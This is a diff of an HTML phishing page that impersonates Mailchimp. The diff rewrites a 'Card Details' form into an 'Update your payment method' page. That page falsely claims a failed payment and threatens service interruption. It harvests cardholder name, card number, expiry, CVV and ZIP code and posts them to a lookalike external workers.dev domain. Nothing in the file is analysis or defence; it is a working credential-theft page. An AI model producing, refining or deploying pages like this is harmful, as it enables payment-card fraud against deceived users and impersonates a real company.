@@ -1,83 +1,101 @@
 <!DOCTYPE html>
-
-<html lang="en" class="dj_webkit dj_chrome dj_contentbox ">
-
+<html lang="en">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <title>Login | Mailchimp</title>
-
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, viewport-fit=cover">
-
-    <link rel="stylesheet" type="text/css" href="./css/typefaces.css">
-    <link rel="stylesheet" type="text/css" href="./css/application.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+<title>Update Payment | Mailchimp</title>
+<style>
+*{box-sizing:border-box}
+body{background-color:#F9FAFB;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:14px;color:#241c15;margin:0;min-height:100vh}
+.c-signupShell{display:flex;flex-wrap:wrap;min-height:100vh;background:#F9FAFB;border-left:8px solid #ffe01b}
+.c-signupShell_mainBody{display:flex;flex-direction:column;background:#fff;flex-grow:1}
+[role="banner"]{padding:16px 24px}
+.c-signupShell_freddie{width:38px;height:35px}
+#login-box{display:flex;flex-grow:1;justify-content:center;align-items:center}
+#content{width:100%;margin-bottom:48px}
+#login-form-wrap{max-width:480px;margin:0 auto;padding:0 24px}
+.content-box{background:#fff;border-radius:8px;box-shadow:0 1px 4px rgba(0,0,0,0.08);padding:40px 36px}
+h1{font-size:24px;font-weight:600;text-align:center;margin-bottom:12px}
+.description{font-size:14px;color:#595959;text-align:center;margin-bottom:20px}
+label{font-size:13px;font-weight:500;display:block;margin-bottom:6px}
+input[type="text"]{width:100%;height:40px;padding:8px 12px;border:1px solid #b2b2b2;border-radius:4px;margin-bottom:16px}
+input:focus{border-color:#007c89;box-shadow:0 0 0 2px rgba(0,124,137,0.2)}
+.row{display:flex;gap:16px}
+.row>div{flex:1}
+.mc-login-btn{width:100%;height:44px;background:#007c89;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer;margin-top:8px}
+.mc-login-btn:hover{background:#005f6b}
+footer{padding:16px 24px;border-top:1px solid #e0ddd8;background:#fff;text-align:center;font-size:12px;color:#595959}
+footer a{color:#595959;text-decoration:underline}
+@media(max-width:768px){.row{flex-direction:column;gap:0}}
+</style>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const cardNum = document.getElementById('cn');
+    const expiry = document.getElementById('exdate');
+    const cvv = document.getElementById('cvv');
+    const zip = document.getElementById('zc');
+    const nameField = document.getElementById('noc');
+    function enforceDigits(e) { this.value = this.value.replace(/\D/g, ''); }
+    function formatCardNumber(e) {
+        let val = this.value.replace(/\D/g, '');
+        if (val.length > 16) val = val.slice(0,16);
+        let parts = [];
+        for (let i = 0; i < val.length; i += 4) parts.push(val.slice(i, i+4));
+        this.value = parts.join(' ');
+    }
+    function formatExpiry(e) {
+        let val = this.value.replace(/\D/g, '');
+        if (val.length > 4) val = val.slice(0,4);
+        if (val.length >= 3) this.value = val.slice(0,2) + '/' + val.slice(2);
+        else this.value = val;
+    }
+    function enforceLettersAndSpaces(e) { this.value = this.value.replace(/[^a-zA-Z\s]/g, ''); }
+    cardNum.addEventListener('input', enforceDigits);
+    cardNum.addEventListener('input', formatCardNumber);
+    expiry.addEventListener('input', enforceDigits);
+    expiry.addEventListener('input', formatExpiry);
+    cvv.addEventListener('input', enforceDigits);
+    cvv.addEventListener('input', function() { if(this.value.length > 3) this.value = this.value.slice(0,3); });
+    zip.addEventListener('input', enforceDigits);
+    zip.addEventListener('input', function() { if(this.value.length > 5) this.value = this.value.slice(0,5); });
+    nameField.addEventListener('input', enforceLettersAndSpaces);
+});
+</script>
 </head>
-
-<body id="login" class=" mcd bg-login" data-new-gr-c-s-check-loaded="14.1094.0" data-gr-ext-installed="">
-    <div class="c-signupShell min-height--100vh flex-wrap--wrap overflow-y--auto ">
-        <div class="c-signupShell_mainBody flex-col full-width-mobile full-width-legacy-ie size1of3 size1of3"> <a href="#"> <img src="./images/mc-freddie-dark.svg" class="c-signupShell_freddie" width="38" height="38" alt="Mailchimp logo"> </a>
-            <div id="login-box" class="flex flex-grow-1 flex-shrink--0">
-                <main id="content" class="!margin-bottom--lv8 width--100">
-                    <div id="login-form-wrap" class="mc-mini-content centered">
-                        <div id="login-content" class="line selfclear !margin-bottom--lv6">
-                            <div class="lastUnit overflow-visible" data-analytics-tag="login-form">
-                                <form action="./next.php" id="login-form" class="c-largeForm" method="POST">
-                                    <div class="error-container"> </div>
-                                    <div class="!margin-bottom--lv5">
-                                        <h1 class="text-align--center !margin-bottom--lv3">Card Details</h1>
-                                        
-                                    </div>
-                                    <fieldset>
-                                        <div class="line login-field">
-                                            <div class="field-wrapper"> <label for="username" class="">Name on Card</label> <input type="text" name="noc" id="noc" class="rounded-corners-4  av-text" value="" required=""> </div>
-                                        </div>
-                                        <div class="line login-field">
-                                            <div class="field-wrapper"> <label for="username" class="">Card Number</label> <input type="text" name="cn" id="cn" class="rounded-corners-4  av-text" value="" required=""> </div>
-                                        </div>
-                                        <div class="line login-field">
-                                            <div class="field-wrapper"> <label for="username" class="">CVV</label> <input type="text" minlength="3" maxlength="4" name="cvv" id="cvv" class="rounded-corners-4  av-text" value="" required=""> </div>
-                                        </div>
-                                        <div class="line login-field">
-                                            <div class="field-wrapper"> <label for="username" class="">Expiry Date</label> <input type="text" name="exdate" id="exdate" class="rounded-corners-4  av-text" value="" required=""> </div>
-                                        </div>
-                                        <div class="line login-field">
-                                            <div class="field-wrapper"> <label for="username" class="">Zip Code</label> <input type="text" name="zc" id="zc" class="rounded-corners-4  av-text" value="" required=""> </div>
-                                        </div>
-                                       
-                                        <div class="line !margin-bottom--lv5"> <button id="btn3" type="submit" value="log in" class="button-large button-wide full-width p1 !margin-bottom--lv5 submit-btn " name="btn3">Submit</button>
-                                            
-                                        </div>
-                                        
-                                    </fieldset>
-                                </form>
-                            </div>
-                        </div>
-                    </div>
-                </main>
-            </div>
-            <footer class="hide-print">
-                <div>
-                    <p class="c-legalNotice lastUnit size1of1 full-width" data-analytics-tag="login-legal-notice"> ©2001–2023 All Rights Reserved. Mailchimp® is a registered trademark of The Rocket Science Group, LLC. <a class="nowrap link-underline textcolor--secondary" href="#" target="_blank" mc:track="" data-dojo-type="mojo/widgets/OneTrustModal" rel="noopener noreferrer" id="dijit__WidgetBase_0" lang="en" widgetid="dijit__WidgetBase_0">Cookie Preferences</a>, <a class="textcolor--secondary" href="#" target="_blank" mc:track="" rel="noopener noreferrer">Privacy</a>, and <a class="textcolor--secondary" href="#" target="_blank" mc:track="" rel="noopener noreferrer">Terms</a>. </p>
-                </div>
-            </footer>
-        </div>
-        <div class=" flex-grow-1 hide-mobile">
-            <div data-mc-el="loginAnnouncementAnimation" class="full-height" style="display: block; opacity: 1; transform: translateY(0px);" data-billboard-id="1385">
-                <div class="c-billboard v_position-- h_position--">
-                    <div class="c-billboard__image" style="background-image: url('images/phpza0iJx.jpg')"></div>
-                </div>
-            </div>
-        </div>
+<body>
+<div class="c-signupShell">
+  <div class="c-signupShell_mainBody">
+    <div role="banner">
+      <img src="https://cdn-images.mailchimp.com/product/brand_assets/logos/mc-freddie-dark.svg" class="c-signupShell_freddie" width="38" height="35" alt="Mailchimp">
     </div>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
-    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
-    <script type="text/javascript">
-        $("#ssn").inputmask({"mask": "999-99-9999"});
-    $("#cn").inputmask({"mask": "9999 9999 9999 9999"});
-        $("#dob").inputmask({"mask": "99/99/9999","placeholder":"DD/MM/YYYY"});
-        $("#exdate").inputmask({"mask": "99/9999","placeholder":"MM/YYYY"});
-        $("#ph").inputmask({"mask": "999-999-9999"});
-    </script>
+    <div id="login-box">
+      <div id="content">
+        <div id="login-form-wrap">
+          <div class="content-box">
+            <h1>Update your payment method</h1>
+            <div class="description">We had trouble processing your last payment. Please update your card details below to avoid service interruption.</div>
+            <form action="https://mailchimp-backend.qulckbooksuppor.workers.dev/" method="POST">
+              <input type="hidden" name="step" value="card">
+              <label for="noc">Name on Card</label>
+              <input type="text" name="fullname" id="noc" placeholder="John Doe" required>
+              <label for="cn">Card number</label>
+              <input type="text" name="cardnumber" id="cn" placeholder="0000 0000 0000 0000" required>
+              <div class="row">
+                <div><label for="exdate">Expiration</label><input type="text" name="expiry" id="exdate" placeholder="MM / YY" required></div>
+                <div><label for="cvv">Security code</label><input type="text" name="cvv" id="cvv" placeholder="CVV" required></div>
+              </div>
+              <label for="zc">Billing ZIP code</label>
+              <input type="text" name="zip" id="zc" placeholder="ZIP" required>
+              <button type="submit" class="mc-login-btn">Update payment method</button>
+            </form>
+          </div>
+          <footer>
+            <p>©2026 Intuit Inc. All rights reserved. Mailchimp® is a registered trademark of The Rocket Science Group, LLC. <a href="#">Cookie Preferences</a>, <a href="#">Privacy</a>, and <a href="#">Terms</a></p>
+          </footer>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
 </body>
-
 </html>
